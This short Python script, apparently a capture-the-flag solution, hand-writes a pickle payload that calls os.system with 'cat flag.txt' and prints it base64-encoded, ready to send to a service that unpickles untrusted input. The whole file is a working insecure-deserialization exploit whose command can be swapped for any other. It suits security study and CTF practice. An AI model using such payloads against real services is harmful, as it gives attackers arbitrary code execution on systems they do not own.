import base64 
import pickle

payload = b"""(cos
system
S'cat flag.txt'
o"""
ab = base64.b64encode(payload)
print(ab)
